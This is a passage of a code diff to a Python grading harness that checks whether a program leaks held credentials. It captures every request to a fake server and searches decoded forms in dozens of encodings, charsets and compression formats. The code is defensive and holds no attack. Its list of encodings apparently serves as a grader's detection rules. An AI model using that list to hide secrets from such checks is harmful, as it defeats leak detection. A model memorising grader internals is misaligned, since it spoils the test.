@@ -87,6 +87,7 @@ import gzip
 import html
 import json
 import os
+import queue
 import re
 import secrets as _secrets
 import shutil
@@ -99,6 +100,8 @@ import threading
 import time
 import unicodedata
 import urllib.parse
+import zlib
+from decimal import Decimal, InvalidOperation
 from concurrent.futures import ThreadPoolExecutor
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
@@ -211,7 +214,9 @@ def encode(form: str, s: str) -> str:
 # Contract 3's binary-to-text decoders, each at every alignment of its block
 # and with a truncated last block kept: (run pattern for any length, run
 # pattern long enough to carry 8 bytes, normaliser, block, allowed tail
-# lengths, decoder).
+# lengths, decoder). A block that does not decode (an Ascii85 group that
+# overflows, an odd hex digit) is replaced by a NUL and the rest still
+# decodes, so one bad block never hides the blocks around it.
 _B85 = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
 _Z85_TO_B85 = str.maketrans(_Z85, _B85)
 _HEX_SEP = re.compile(r"[\s:,.-]")
@@ -223,28 +228,159 @@ ALIGNED = {
     "base32hex": (r"[0-9A-Va-v]", 13, str.upper, 8, (0, 2, 4, 5, 7),
                   lambda u: base64.b32hexdecode(u + "=" * (-len(u) % 8))),
     "hex": (r"(?:[0-9A-Fa-f]{2}[\s:,.-]?)", 8, lambda r: _HEX_SEP.sub("", r), 2, (0,), bytes.fromhex),
-    "ascii85": (r"[!-uz]", 10, lambda r: r, 5, (0, 2, 3, 4), base64.a85decode),
+    "ascii85": (r"[!-uz]", 10, lambda r: r.replace("z", "!!!!!"), 5, (0, 2, 3, 4), base64.a85decode),
     "base85": (re.escape(_B85).join("[]"), 10, lambda r: r, 5, (0, 2, 3, 4), base64.b85decode),
     "z85": (re.escape(_Z85).join("[]"), 10, lambda r: r.translate(_Z85_TO_B85), 5, (0, 2, 3, 4), base64.b85decode),
 }
-_ALIGNED_RX = {k: (re.compile(f"{c}{{2,}}"), re.compile(f"{c}{{{m},}}")) for k, (c, m, *_r) in ALIGNED.items()}
+# Characters each decoder needs to carry n bytes.
+_CHARS_FOR = {"base64": lambda n: -(-4 * n // 3), "base32": lambda n: -(-8 * n // 5), "base32hex": lambda n: -(-8 * n // 5),
+              "hex": lambda n: n, "ascii85": lambda n: -(-5 * n // 4), "base85": lambda n: -(-5 * n // 4),
+              "z85": lambda n: -(-5 * n // 4)}   # hex counts pairs
+_RX_CACHE: dict = {}
 
 
-def _bytes_views(b: bytes) -> list[str]:
-    out = [b.decode("latin-1")]
-    if b"\x00" in b or b"\xff" in b:   # UTF-16, LE and BE, at both byte alignments
-        out += [b[k:].decode(e, "replace") for e in ("utf-16-le", "utf-16-be") for k in (0, 1)]
+def _aligned_rx(kind: str, n: int) -> re.Pattern:
+    """The run pattern of `kind` long enough to carry `n` bytes."""
+    key = (kind, n)
+    if key not in _RX_CACHE:
+        _RX_CACHE[key] = re.compile(f"{ALIGNED[kind][0]}{{{max(2, _CHARS_FOR[kind](n))},}}")
+    return _RX_CACHE[key]
+# Charsets of golang.org/x/text/encoding that are not ASCII-compatible or that
+# spell fullwidth forms in multi-byte sequences (UTF-16 and UTF-32 are read
+# separately): EBCDIC and the CJK encodings.
+_CHARSETS = ("cp037", "cp500", "shift_jis", "euc_jp", "iso2022_jp", "gb18030", "hz", "big5", "euc_kr")
+MAX_INFLATE = 8 * 1024 * 1024
+
+
+def _dec_blocks(dec, v: str, block: int) -> bytes:
+    try:
+        return dec(v)
+    except (ValueError, TypeError):   # binascii.Error is a ValueError
+        pass
+    out = []
+    for i in range(0, len(v), block):
+        try:
+            out.append(dec(v[i:i + block]))
+        except (ValueError, TypeError):
+            out.append(b"\x00")
+    return b"".join(out)
+
+
+# Characters a credential made of ASCII can be spelled in: ASCII itself and
+# its compatibility forms (superscripts, letterlike and enclosed forms,
+# fullwidth, mathematical alphanumerics).
+_ASCIIISH = re.compile("[^\t\n\r\x20-\x7e\u00aa\u00b2\u00b3\u00b9\u00ba\u2070-\u209f\u2100-\u214f"
+                       "\u2460-\u24ff\uff01-\uff5e\U0001d400-\U0001d7ff]")
+
+
+def _spellable(r: str) -> bool:
+    """A reading of decoded bytes worth comparing: half or more of its first
+    characters are ASCII or a compatibility form of it. Random bytes read as
+    UTF-16, UTF-32 or a CJK charset are not."""
+    head = r[:96]
+    return bool(head) and _ASCIIISH.subn("", head)[1] <= 0.5 * len(head)
+
+
+# The high byte of a UTF-16 unit that spells an ASCII credential: ASCII and
+# Latin-1 superscripts (0x00), superscripts, letterlike and enclosed forms
+# (0x20-0x24), fullwidth forms (0xFF), mathematical alphanumerics (surrogates).
+_U16_HIGH = bytes([0x00, 0x20, 0x21, 0x22, 0x23, 0x24, 0xFF, 0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF])
+_ASCII_BYTES = bytes(range(128))
+
+
+def _mostly(bs: bytes, allowed: bytes) -> bool:
+    return bool(bs) and len(bs.translate(None, allowed)) <= len(bs) // 2
+
+
+def _readings(b: bytes, every: bool) -> list[tuple[str, int]]:
+    """The encodings (and byte offsets) worth reading `b` in: all of them for
+    the unit's own bytes (`every`); for decoded bytes, those whose byte
+    pattern can spell an ASCII credential."""
+    out = [("utf-8", 0)] if not b.isascii() else []
+    for k in (0, 1):
+        if len(b) >= 2 + k and (every or _mostly(b[k + 1::2], _U16_HIGH)):
+            out.append(("utf-16-le", k))
+        if len(b) >= 2 + k and (every or _mostly(b[k::2], _U16_HIGH)):
+            out.append(("utf-16-be", k))
+    for k in range(4):
+        if len(b) >= 4 + k and (every or _mostly(b[k + 3::4], b"\x00")):
+            out.append(("utf-32-le", k))
+        if len(b) >= 4 + k and (every or _mostly(b[k::4], b"\x00")):
+            out.append(("utf-32-be", k))
+    if every or b"\x1b" in b or b"~{" in b or len(b.translate(None, _ASCII_BYTES)) >= len(b) // 4 > 0:
+        out += [(cs, 0) for cs in _CHARSETS]
     return out
 
 
-def aligned_decodings(s: str, carry: bool = False) -> set[str]:
+def _bytes_views(b: bytes, every: bool = False) -> list[str]:
+    """Bytes read every way contract 3 names: byte for byte, UTF-8, UTF-16 LE
+    and BE at both alignments, UTF-32 LE and BE at every alignment, and the
+    charsets above (BOM or not; no byte-presence prerequisite). `every` keeps
+    every reading (the unit's own bytes); otherwise a reading other than the
+    byte-exact one is made only when its byte pattern can spell an ASCII
+    credential (_readings) and kept only when it does (_spellable)."""
+    out = [b.decode("latin-1")]
+    for e, k in _readings(b, every):
+        try:
+            if not every and not _spellable(b[k:k + 384].decode(e, "replace")):
+                continue
+            out.append(b[k:].decode(e, "replace"))
+        except (UnicodeError, LookupError):
+            pass
+    return out
+
+
+_ZLIB_AT = re.compile(rb"(?=[\x08\x18\x28\x38\x48\x58\x68\x78].)", re.S)
+
+
+def _inflate(b: bytes, every: bool) -> list[bytes]:
+    """gzip and zlib streams wherever their headers are, and raw deflate at
+    offset 0 (`every`: at every offset), trailing bytes after a stream kept
+    aside (contract 3). Raises _Exhausted when a stream decodes past
+    MAX_INFLATE: it cannot be checked whole."""
+    starts = [(m.start(), 31) for m in re.finditer(rb"\x1f\x8b", b)]
+    starts += [(m.start(), 15) for m in _ZLIB_AT.finditer(b) if ((b[m.start()] << 8) | b[m.start() + 1]) % 31 == 0]
+    starts += [(i, -15) for i in (range(len(b)) if every else range(min(1, len(b))))]
+    out = []
+    for i, wbits in starts:
+        d = zlib.decompressobj(wbits)
+        try:
+            x = d.decompress(b[i:], MAX_INFLATE)
+        except zlib.error:
+            continue
+        if d.unconsumed_tail:
+            raise _Exhausted("a compressed stream decodes past the inflate limit")
+        if len(x) >= 3:
+            out.append(x)
+    return out
+
+
+class _Exhausted(Exception):
+    """Contract 3's budget ran out before every path was checked: the unit
+    counts as a match."""
+
+
+def _need(carry) -> int:
+    """Bytes a decoding must carry: `carry` True means any held value (the
+    shortest is 3 characters), False a piece the contract counts (8), or the
+    number itself."""
+    return 3 if carry is True else PIECE if carry is False else max(1, int(carry))
+
+
+def aligned_bytes(s: str, carry=False, memo: set | None = None) -> set[bytes]:
     """Every base64, base32 (both alphabets, any case), hex (with or without
-    separators) and Ascii85/base85/Z85 run in `s`, decoded at every alignment
-    of its block, truncated last block kept. `carry` decodes runs of any
-    length; otherwise only runs long enough to carry 8 bytes."""
-    out: set[str] = set()
+    separators) and Ascii85/base85/Z85 run in `s` long enough to carry
+    _need(carry) bytes, decoded at every alignment of its block, truncated
+    last block kept. `memo`: runs (and bytes) one unit already decoded, whose
+    decodings it has already seen, are skipped."""
+    out: set[bytes] = set()
+    need = _need(carry)
     for kind, (_c, _m, norm, block, tails, dec) in ALIGNED.items():
-        for run in set(_ALIGNED_RX[kind][0 if carry else 1].findall(s)):
+        for run in set(_aligned_rx(kind, need).findall(s)):
+            if memo is not None:
+                if (kind, run) in memo:
+                    continue
+                memo.add((kind, run))
             u = norm(run).rstrip("=")
             for shift in range(min(block, len(u))):
                 v = u[shift:]
@@ -253,16 +389,31 @@ def aligned_decodings(s: str, carry: bool = False) -> set[str]:
                     n -= 1
                 if n < 2:
                     continue
-                try:
-                    out.update(_bytes_views(dec(v[:n])))
-                except (ValueError, TypeError):   # binascii.Error is a ValueError
-                    pass
+                b = _dec_blocks(dec, v[:n], block)
+                if len(b) >= need and b.strip(b"\x00") and (memo is None or b not in memo):
+                    out.add(b)
+    if memo is not None:
+        memo.update(out)
+    return out
+
+
+def aligned_decodings(s: str, carry=False, memo: set | None = None) -> set[str]:
+    """aligned_bytes, each read every way (_bytes_views), and inflated."""
+    out: set[str] = set()
+    for b in aligned_bytes(s, carry, memo):
+        out.update(_bytes_views(b))
+        for x in _inflate(b, every=False):
+            out.update(_bytes_views(x))
     return out
 
 
 _QP = re.compile(r"=([0-9A-Fa-f]{2})")
+_QP_SOFT = re.compile(r"=\r?\n")
 _OCTAL = re.compile(r"\\([0-7]{3})")
+_GO_U = re.compile(r"\\U([0-9A-Fa-f]{8})")
+_PAIR = re.compile("[\ud800-\udbff][\udc00-\udfff]")
 _CODES = re.compile(r"(?:(?:0[xX][0-9A-Fa-f]{1,6}|\d{1,7})[,\s]+)+(?:0[xX][0-9A-Fa-f]{1,6}|\d{1,7})")
+_MIME_WORD = re.compile(r"=\?([^?\s]+)\?([BbQq])\?([^?\s]*)\?=")
 
 
 def _codes(s: str) -> str:
@@ -272,22 +423,168 @@ def _codes(s: str) -> str:
     return _CODES.sub(chars, s)
 
 
-def text_decodings(s: str) -> set[str]:
-    """One step of every contract 3 decoder that keeps text text: ROT13,
-    percent-encoding, entities, string escapes, octal, quoted-printable and
-    MIME Q, character-code lists, plus the aligned binary-to-text decoders."""
-    out = {codecs.encode(s, "rot13"), urllib.parse.unquote(s), html.unescape(s), ch.json_unescape(s),
-           _OCTAL.sub(lambda m: chr(int(m.group(1), 8)), s), _QP.sub(lambda m: chr(int(m.group(1), 16)), s),
-           _codes(s)}
-    out |= aligned_decodings(s, carry=True)
+def _unescape(s: str) -> str:
+    """String escapes: JSON \\uXXXX (surrogate pairs joined), \\xXX, Go and
+    TOML \\UXXXXXXXX, and the single-character escapes."""
+    t = ch.json_unescape(_GO_U.sub(lambda m: chr(int(m.group(1), 16)) if int(m.group(1), 16) <= 0x10FFFF
+                                   else m.group(0), s))
+    return _PAIR.sub(lambda m: chr(0x10000 + ((ord(m.group(0)[0]) - 0xD800) << 10) + ord(m.group(0)[1]) - 0xDC00), t)
+
+
+def _mime_words(s: str) -> list[str]:
+    """MIME encoded words, B and Q, decoded in their own charset and read every
+    other way too."""
+    out = []
+    for cs, enc, data in _MIME_WORD.findall(s):
+        try:
+            b = (base64.b64decode(data + "=" * (-len(data) % 4)) if enc in "Bb" else
+                 _QP.sub(lambda m: chr(int(m.group(1), 16)), data.replace("_", " ")).encode("latin-1", "replace"))
+        except ValueError:
+            continue
+        out += _bytes_views(b)
+        try:
+            out.append(b.decode(cs.split("*")[0], "replace"))
+        except (LookupError, UnicodeError):
+            pass
+    return out
+
+
+class _Pairs(list):
+    """A JSON object kept as its (key, value) pairs, duplicate keys included."""
+
+
+def _joined(s: str) -> tuple[set[str], set[str]]:
+    """Contract 3, joined values: in each JSON document of `s` (the whole text,
+    or a line of JSON lines), (whole, local): every string of the document
+    joined in order (keys and values, and values alone), and the string
+    values of each one object or array joined in order. A credential split
+    across fields shows whole in the first; a short one keeps its token
+    boundaries in the second."""
+    whole: set[str] = set()
+    local: set[str] = set()
+    t = s.strip()
+    docs = [t] if t[:1] in ("[", "{") else []
+    if "\n" in t:
+        docs += [ln.strip() for ln in t.splitlines()[:2000] if ln.strip()[:1] in ("[", "{")]
+    for d in docs:
+        try:
+            doc = json.loads(d, object_pairs_hook=_Pairs)
+        except (ValueError, RecursionError):
+            continue
+        flat: list[str] = []
+        vals_only: list[str] = []
+        stack = [doc]
+        while stack:
+            x = stack.pop()
+            if isinstance(x, _Pairs):
+                keys = [k for k, _v in x]
+                vals = [v for _k, v in x if isinstance(v, str)]
+                for parts in (keys, vals):
+                    if len(parts) > 1:
+                        local.add("".join(parts))
+                for k, v in reversed(x):
+                    stack.append(v)
+                    stack.append(("k", k))
+            elif isinstance(x, tuple):
+                flat.append(x[1])
+            elif isinstance(x, list):
+                parts = [v for v in x if isinstance(v, str)]
+                if len(parts) > 1:
+                    local.add("".join(parts))
+                stack.extend(reversed(x))
+            elif isinstance(x, str):
+                flat.append(x)
+                vals_only.append(x)
+        for parts in (flat, vals_only):
+            if len(parts) > 1:
+                whole.add("".join(parts))
+    return whole, local - whole
+
+
+def _as_bytes(s: str) -> bytes | None:
+    """A decoding whose characters are all bytes (percent, QP, octal, \\x),
+    when it has a byte that is not plain ASCII text: read it as bytes too."""
+    if s and max(s) <= "\xff" and (max(s) >= "\x80" or "\x00" in s):
+        return s.encode("latin-1")
+    return None
+
+
+def _fixed(f, s: str, rounds: int = 8) -> str:
+    for _ in range(rounds):
+        t = f(s)
+        if t == s:
+            break
+        s = t
+    return s
+
+
+_TEXTUAL = (urllib.parse.unquote, html.unescape, _unescape, lambda s: _OCTAL.sub(lambda m: chr(int(m.group(1), 8)), s),
+            lambda s: _QP.sub(lambda m: chr(int(m.group(1), 16)), _QP_SOFT.sub("", s)), _codes)
+
+
+def _all_textual(s: str) -> str:
+    for f in _TEXTUAL:
+        s = f(s)
+    return s
+
+
+def textual_decodings(s: str) -> set[str]:
+    """The contract 3 decoders that turn text into text: percent-encoding
+    (repeated), entities, string escapes, octal, quoted-printable (soft line
+    breaks too), character-code lists, MIME encoded words and joined values,
+    each to its fixed point, all of them together to theirs, and ROT13
+    before and after."""
+    out = {_fixed(f, s) for f in _TEXTUAL}
+    mixed = _fixed(_all_textual, s)
+    r13 = codecs.encode(s, "rot13")
+    out |= {mixed, r13, codecs.encode(mixed, "rot13"), _fixed(_all_textual, r13)}
+    out.update(_mime_words(s))
+    out |= _joined(s)[0]
     out.discard(s)
     return out
 
 
+def binary_decodings(s: str, carry: bool = True, memo: set | None = None) -> set[str]:
+    """The contract 3 decoders that turn text into bytes, each read every way
+    (_bytes_views) and inflated: the aligned binary-to-text decoders, percent
+    escapes of bytes, and a decoding made of bytes (QP, octal, \\x)."""
+    out = aligned_decodings(s, carry=carry, memo=memo)
+    if "%" in s:
+        out.update(_bytes_views(urllib.parse.unquote_to_bytes(_raw(s))))
+    b = _as_bytes(s)
+    if b is not None:
+        out.update(_bytes_views(b))
+        for y in _inflate(b, every=False):
+            out.update(_bytes_views(y))
+    out.discard(s)
+    return out
+
+
+def text_decodings(s: str, carry: bool = True) -> set[str]:
+    """One step of every contract 3 decoder."""
+    out = textual_decodings(s)
+    for t in out | {s}:
+        out |= binary_decodings(t, carry)
+    out.discard(s)
+    return out
+
+
+_UNPRINTABLE = re.compile("[\x00-\x08\x0b\x0c\x0e-\x1f\x7f-\x9f\ud800-\udfff\ufffd\ufffe\uffff]")
+_NOT_ASCII_TEXT = re.compile(r"[^ -~\t\r\n]")
+
+
 def _texty(s: str) -> bool:
-    """A decoding worth decoding again: almost all printable. A decoding at
-    the wrong alignment is random bytes and stops here."""
-    return bool(s) and sum(c.isprintable() or c in "\t\r\n" for c in s) >= 0.9 * len(s)
+    """A decoding that reads as text: almost all printable (control
+    characters, lone surrogates and replacement characters are not). A
+    decoding at the wrong alignment is random bytes."""
+    return bool(s) and _UNPRINTABLE.subn("", s)[1] <= 0.1 * len(s)
+
+
+def _decodable(s: str) -> bool:
+    """A decoding worth decoding again: almost all printable ASCII, the
+    alphabet of every contract 3 decoder. Random bytes read in some charset
+    can be printable text; they carry no encoding and stop here."""
+    return bool(s) and _NOT_ASCII_TEXT.subn("", s)[1] <= 0.1 * len(s)
 
 
 def _carries_piece(s: str, cred: str, depth: int = 6, seen: set | None = None) -> bool:
@@ -302,7 +599,7 @@ def _carries_piece(s: str, cred: str, depth: int = 6, seen: set | None = None) -
     f, fc = _fold(s), _fold(cred)
     if (len(cred) >= PIECE and _piece(f, fc)) or (len(cred) < PIECE and fc in f):
         return True
-    if depth == 0 or not _texty(s):
+    if depth == 0 or not _decodable(s):
         return False
     return any(_carries_piece(c, cred, depth - 1, seen) for c in text_decodings(s))
 
@@ -476,9 +773,16 @@ def _is_token_request(method: str, path: str, body: bytes) -> bool:
     return method == "POST" and ("token" in pl or "oauth" in pl or b"grant_type" in body)
 
 
+def _utf8(v: str) -> str:
+    """A header or request line as the bytes it was (Python's parser reads them
+    as ISO-8859-1), read as UTF-8 with every other byte kept exactly."""
+    return v.encode("latin-1", "replace").decode("utf-8", "surrogateescape")
+
+
 class Fake:
     def __init__(self, respond, token):
         self.requests: list = []
+        self.served: list = []   # every response it sent: (headers, body)
         self.lock = threading.Lock()
         fake = self
 
@@ -494,29 +798,52 @@ class Fake:
                 except OSError:
                     pass
 
-            def _body(self) -> bytes:
+            def _body(self, trailers: list) -> bytes:
                 if "chunked" in (self.headers.get("Transfer-Encoding") or "").lower():
                     body = b""
                     while True:
                         size = int(self.rfile.readline().split(b";")[0].strip(), 16)
                         if size == 0:
-                            while self.rfile.readline().strip():
-                                pass
+                            while (ln := self.rfile.readline()).strip():
+                                k, _, v = ln.decode("utf-8", "surrogateescape").partition(":")
+                                trailers.append((k.strip(), v.strip()))
                             return body
                         body += self.rfile.read(size)
                         self.rfile.readline()
                 n = int(self.headers.get("Content-Length") or 0)
                 return self.rfile.read(n) if n else b""
 
+            def __getattr__(self, name):
+                # Every method is captured, not only the ones named here.
+                if name.startswith("do_"):
+                    return self._go
+                raise AttributeError(name)
+
+            def send_error(self, code, message=None, explain=None):
+                # A request the parser refused cannot be read: judged as a leak.
+                fake.unreadable = True
+                with fake.lock:
+                    fake.requests.append(("?", _utf8((getattr(self, "raw_requestline", b"") or b"").decode("latin-1")),
+                                          [], b""))
+                super().send_error(code, message, explain)
+
             def _go(self):
+                # Every occurrence of a repeated header, in order, and every
+                # trailer of a chunked body.
+                hdrs = [(_utf8(k), _utf8(v)) for k, v in self.headers.items()]
                 try:
-                    body = self._body()
+                    body = self._body(hdrs)
                 except (ValueError, OSError):
                     body, fake.unreadable = b"", True   # judged as a leak: it could not be read
                 with fake.lock:
-                    # Every occurrence of a repeated header, in order.
-                    fake.requests.append((self.command, self.path, list(self.headers.items()), body))
+                    fake.requests.append((self.command, _utf8(self.path), hdrs, body))
                 st, hd, bd = token() if _is_token_request(self.command, self.path, body) else respond(self.path)
+                with fake.lock:
+                    fake.served.append((hd, bd))
+                if self.command == "CONNECT":
+                    # What follows is a TLS tunnel, not a request: the CONNECT
+                    # itself is what an https request shows (a known limit).
+                    self.close_connection = True
                 self.send_response(st)
                 for k, v in hd.items():
                     self.send_header(k, v)
@@ -526,8 +853,6 @@ class Fake:
                     self.wfile.write(bd)
                 except OSError:
                     pass
-
-            do_GET = do_POST = do_PUT = do_PATCH = do_DELETE = do_HEAD = do_CONNECT = _go
 
         self.rearm = lambda: None   # a redirecting case re-arms its hops per process
         self.unreadable = False
@@ -588,8 +913,11 @@ def request_view(path: str, headers: list[tuple[str, str]], raw: bytes) -> str:
 # --------------------------------------------------------------------------- #
 
 _LONGRUN = re.compile(r"(.)\1{999,}", re.S)
-_SHORT_B64 = re.compile(r"[A-Za-z0-9+/_-]{4,11}={0,2}")
 PIECE = 8   # contract 2(b): a contiguous piece of 8 or more characters
+DEPTH = 6   # contract 3: decoders applied recursively, this deep
+# Contract 3's budget: decoded characters per unit. A unit whose decodings run
+# past it is a match (fail closed), never a pass.
+BUDGET_BASE, BUDGET_PER_CHAR = 32 * 1024 * 1024, 64
 
 
 def _fold(s: str) -> str:
@@ -597,37 +925,61 @@ def _fold(s: str) -> str:
     return unicodedata.normalize("NFKC", s).casefold()
 
 
-def _present(view: str, needle: str) -> bool:
-    if len(needle) >= PIECE:
+def _present(view: str, needle: str, outbound: bool = False) -> bool:
+    """Contract 2(a): a value of 8 or more characters anywhere; a shorter one
+    as a whole token. An outbound request is judged by 2(c): any form of the
+    whole value, with no token boundaries."""
+    if len(needle) >= PIECE or outbound:
         return needle in view
     return re.search(r"(?<![A-Za-z0-9])" + re.escape(needle) + r"(?![A-Za-z0-9])", view) is not None
 
 
-def _piece(view: str, cred: str) -> str | None:
-    """The first contiguous piece of `cred`, PIECE characters long, in `view`."""
+def _piece(view: str, cred: str, skip: frozenset = frozenset()) -> str | None:
+    """The first contiguous piece of `cred`, PIECE characters long, in `view`.
+    `skip` holds pieces the harness itself also gave the program as a value
+    that is not held (its fake server's address): no evidence either way."""
     for i in range(len(cred) - PIECE + 1):
-        if cred[i:i + PIECE] in view:
-            return cred[i:i + PIECE]
+        w = cred[i:i + PIECE]
+        if w not in skip and w in view:
+            return w
     return None
 
 
-def _views(text: str) -> tuple[str, set]:
-    if len(text) > 200_000:
-        text = _LONGRUN.sub(lambda m: m.group(1) * 5, text)
-    views = ch._decode_views(text) if len(text) < 400_000 else {text}
-    if len(text) < 200_000:
-        extra = set()
-        for v in list(views)[:50]:
-            for run in set(_SHORT_B64.findall(v)):
-                std = run.replace("-", "+").replace("_", "/").rstrip("=")
-                try:
-                    dec = base64.b64decode(std + "=" * (-len(std) % 4)).decode("latin-1")
-                except Exception:  # noqa: BLE001
-                    continue
-                extra.add(dec)
-                extra.add(urllib.parse.unquote(dec))
-        views = set(views) | extra
-    return text, views
+_NUM = re.compile(r"(?<![A-Za-z0-9])([0-9](?:[0-9,_' .  ]*[0-9])?)(?:[eE]([+-]?[0-9]+))?(?![A-Za-z0-9])")
+
+
+_NUM_SEPS = dict.fromkeys(map(ord, ",_' .\u00a0\u202f"))
+
+
+def _spelled(view: str, digits: str) -> str | None:
+    """Contract 3, numbers: another integer spelling of an all-digit
+    credential in `view`: leading zeros, digit grouping (one separator,
+    groups of three after the first; any run of whole groups), scientific
+    notation."""
+    want = int(digits)
+    # Every spelling, its separators and exponent's sign aside, carries the
+    # significant digits in order: a view without them has none.
+    if (str(want).rstrip("0") or "0") not in view.translate(_NUM_SEPS):
+        return None
+    for m in _NUM.finditer(view):
+        tok, exp = m.group(1), m.group(2)
+        if exp is not None and re.fullmatch(r"[0-9]+(?:\.[0-9]+)?", tok):
+            try:
+                if Decimal(f"{tok}e{exp}") == want:
+                    return m.group(0)
+            except InvalidOperation:
+                pass
+        parts = re.findall(r"[0-9]+|[^0-9]+", tok)
+        groups, seps = parts[0::2], parts[1::2]
+        for i in range(len(groups)):
+            if int(groups[i]) == want:
+                return groups[i]
+            for j in range(i + 1, len(groups)):
+                if len(seps[j - 1]) != 1 or seps[j - 1] != seps[i] or len(groups[j]) != 3 or not 1 <= len(groups[i]) <= 3:
+                    break
+                if int("".join(groups[i:j + 1])) == want:
+                    return seps[i].join(groups[i:j + 1])
+    return None
 
 
 def _raw(text: str) -> bytes:
@@ -639,88 +991,203 @@ def _raw(text: str) -> bytes:
         return text.encode("utf-8", "surrogatepass")
 
 
-def utf16_texts(text: str) -> list[str]:
-    """Contract 3: the UTF-16 LE and BE readings of a unit, at both byte
-    alignments, BOM or not. Only a unit with a NUL or 0xFF byte can carry a
-    credential in UTF-16 (ASCII has a zero high byte, fullwidth forms 0xFF)."""
+def unit_views(text: str, short):
+    """Every view of one unit contract 3 reaches, yielded as (view, texty):
+    the unit itself and its bytes read every way (UTF-8, UTF-16, UTF-32,
+    EBCDIC, CJK charsets) and inflated at every offset; then every decoder,
+    recursively, DEPTH deep, a decoding decoded again only when it reads as
+    text. `short`: a held value is shorter than PIECE, so runs of any length
+    are decoded. Raises _Exhausted past the budget (fail closed)."""
+    if len(text) > 200_000:
+        text = _LONGRUN.sub(lambda m: m.group(1) * 5, text)
+    budget = [BUDGET_BASE + BUDGET_PER_CHAR * len(text)]
+    memo: set = set()   # aligned runs and bytes this unit already decoded
+    seen: set[str] = set()
+
+    def new(v: str) -> bool:
+        if v in seen:
+            return False
+        budget[0] -= len(v)
+        if budget[0] < 0:
+            raise _Exhausted("the decoding budget ran out before every path was checked")
+        seen.add(v)
+        return True
+
+    # Every decoder reads only ASCII (a decoding made of bytes is read from
+    # the bytes it came from), so two decodings with the same ASCII are
+    # decoded once: readings of the same bytes in ASCII-compatible charsets
+    # are compared, never decoded again.
+    keys: set[bytes] = set()
+
+    def fresh(v: str) -> bool:
+        k = v.encode("ascii", "ignore")
+        if k in keys:
+            return False
+        keys.add(k)
+        return True
+
+    # The shortest text any binary decoder turns into _need(short) bytes.
+    floor = min(f(_need(short)) for f in _CHARS_FOR.values())
     raw = _raw(text)
-    if b"\x00" not in raw and b"\xff" not in raw:
-        return []
-    return [raw[k:].decode(enc, "replace") for enc in ("utf-16-le", "utf-16-be") for k in (0, 1)]
+    seen.add(text)
+    yield text, True
+    frontier = [text]
+    fresh(text)
+    level0 = [(raw, True)] + [(x, True) for x in _inflate(raw, every=True)]
+    for b, _primary in level0:
+        for i, r in enumerate(_bytes_views(b, every=True)):
+            if new(r):
+                yield r, _texty(r)
+                if (i == 0 or _decodable(r)) and fresh(r):   # the byte-exact reading is always decoded on
+                    frontier.append(r)
+    if len(text) < 400_000:
+        for v in ch._decode_views(text):
+            if new(v):
+                yield v, _texty(v)
+                if _decodable(v) and fresh(v):
+                    frontier.append(v)
+    # Text-to-text decoders run to their fixed point once per node; only a
+    # binary decoder (whose output is new text) goes a level deeper, so
+    # decoders that each change a character or two never compound.
+    for _depth in range(DEPTH):
+        nxt = []
+        for s in frontier:
+            texts = [s]
+            for t in textual_decodings(s):
+                if new(t):
+                    yield t, _texty(t)
+                    if _decodable(t) and fresh(t):
+                        texts.append(t)
+            for t in texts:
+                for d in _joined(t)[1]:   # one object's or array's strings joined: compared only
+                    if new(d):
+                        yield d, _texty(d)
+                for d in binary_decodings(t, carry=short, memo=memo):
+                    if new(d):
+                        yield d, _texty(d)
+                        if _decodable(d) and len(d) >= floor and fresh(d):
+                            nxt.append(d)
+        frontier = nxt
 
 
-def leaked(text: str, creds: list[str], needle_sets: list[list[str]], utf16: bool = True) -> str | None:
-    """How a held credential survives in `text`, or None."""
+def _alt(words) -> re.Pattern | None:
+    words = sorted({w for w in words if w}, key=len, reverse=True)
+    return re.compile("|".join(map(re.escape, words))) if words else None
+
+
+class _Matcher:
+    """Contract 2 for one set of held values, compiled once per unit: every
+    8-character piece of a value of 8 or more (`skip` aside) as one pattern,
+    the shorter values as whole tokens (or anywhere, for an outbound
+    request), raw and folded."""
+
+    def __init__(self, creds: list[str], needle_sets: list[list[str]], outbound: bool, skip: frozenset):
+        self.creds, self.sets, self.outbound = creds, needle_sets, outbound
+        self.fsets = [[_fold(n) for n in ns] for ns in needle_sets]
+        self.needles = {n for ns in needle_sets for n in ns}
+        self.fneedles = {n for ns in self.fsets for n in ns}
+        self.digits = [c for c in creds if c.isdigit()]
+        self.pat = {}
+        for key, cs, sk in (("raw", creds, skip), ("fold", [_fold(c) for c in creds], frozenset(_fold(w) for w in skip))):
+            pieces = {c[i:i + PIECE] for c in cs if len(c) >= PIECE for i in range(len(c) - PIECE + 1)} - sk
+            shorts = [c for c in cs if len(c) < PIECE]
+            sx = _alt(shorts)
+            if sx is not None and not outbound:
+                sx = re.compile(r"(?<![A-Za-z0-9])(?:" + sx.pattern + r")(?![A-Za-z0-9])")
+            nwin = {n[i:i + PIECE] for n in (self.needles if key == "raw" else self.fneedles)
+                    for i in range(len(n) - PIECE + 1)}
+            self.pat[key] = (_alt(pieces), sx, _alt(nwin))
+
+    def judge(self, v: str, texty: bool) -> str | None:
+        for key, vv, sets, needles in (("raw", v, self.sets, self.needles), ("fold", _fold(v), self.fsets, self.fneedles)):
+            pieces, shorts, nwin = self.pat[key]
+            for ns in sets:
+                if ns and all(_present(vv, n, self.outbound) for n in ns):
+                    return "payload"
+            if pieces is not None and pieces.search(vv):
+                return "the credential, or an 8+ character piece of it"
+            # A view that does not read as text is random bytes: a short value
+            # would match it by chance, so only 8+ is sought there.
+            if not texty:
+                continue
+            if shorts is not None and shorts.search(vv):
+                return "credential"
+            if key == "raw" and any(_spelled(vv, c) for c in self.digits):
+                return "another integer spelling of the credential"
+            if nwin is not None and nwin.search(vv):
+                for n in needles:
+                    if segment_piece(vv, n, self.creds):
+                        return "a piece of the payload carrying 8+ credential characters"
+        return None
+
+
+def leaked(text: str, creds: list[str], needle_sets: list[list[str]], outbound: bool = False,
+           skip: frozenset = frozenset()) -> str | None:
+    """How a held credential survives in one unit, or None: contract 2 judged
+    on every view of contract 3 (unit_views), folded (NFKC and case). A unit
+    whose decodings exhaust the budget is a match."""
     if not text:
         return None
-    for u in utf16_texts(text) if utf16 else []:
-        how = leaked(u, creds, needle_sets, utf16=False)
-        if how:
-            return how + " (UTF-16)"
-    text, views = _views(text)
-    fsets = [[_fold(n) for n in ns] for ns in needle_sets]
-    fcreds = [_fold(c) for c in creds]
-    for v in views:
